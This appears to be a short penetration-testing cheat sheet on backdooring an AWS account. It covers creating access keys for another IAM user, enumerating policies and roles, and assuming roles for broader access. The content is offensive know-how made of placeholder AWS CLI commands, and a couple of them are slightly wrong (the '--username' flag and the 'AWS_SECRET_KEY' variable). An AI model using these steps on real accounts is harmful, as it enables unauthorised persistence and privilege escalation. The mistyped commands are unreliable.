# Persistence and Backdooring

### Suppose we have two users, the user A has permissions to create Access Keys to user B, this misconfig allows us to create an access key for user B and persist our access.

#### 1) Creating a new access key for another user

    aws iam create-access-key --username EXAMPLE_USERNAME

#### 2) Configuring AWS cli for the new user

    aws configure --profile EXAMPLE_PROFILE

### Remember, a user can have a maximum of 2 access keys.

#### 3) Testing the credential

    aws sts get-caller-identity --profile EXAMPLE_PROFILE

#### 4) Accessing more credentials

### It's possible to assume other roles with the sts:AssumeRole permission (Example: A user doesn't have access to an s3 instance, but it has this permission, we can easily assume other roles if we are in the trust relationship, increasing our access in the instance)

#### Listing managed policies attached to a user

    aws iam list-attached-user-policies --user-name EXAMPLE_USERNAME 

#### Retrieving information about a specific policy

    aws iam get-policy --policy-arn ARN 

#### Listing information about the version of the policy

    aws iam list-policy-versions --policy-arn ARN 

#### Retrieving information about a specific version

    aws iam get-policy-version --policy-arn POLICY_ARN --version-id ID

#### Listing IAM roles
  
    aws iam list-roles 

#### Listing trust relationship between role and user (Which roles we can assume)

    aws iam get-role --role-name ROLE_NAME 

#### Listing all managed policies attached to the specific IAM role

    aws iam list-attached-role-policies --role-name ROLE_NAME 

#### Retrieving information about the specified version of the policy

    aws iam get-policy-version --policy-arn POLICY_ARN --version-id ID 

#### Getting temporary credentials for the role

    aws sts assume-role --role-arn ROLE_ARN --role-session-name SESSION_NAME 

### Configuring AWS cli with newer credentials (On Linux)

    export AWS_ACCESS_KEY_ID

    export AWS_SECRET_KEY

    export AWS_SESSION_TOKEN

    aws sts get-caller-identity (Getting information about the temporary credential)
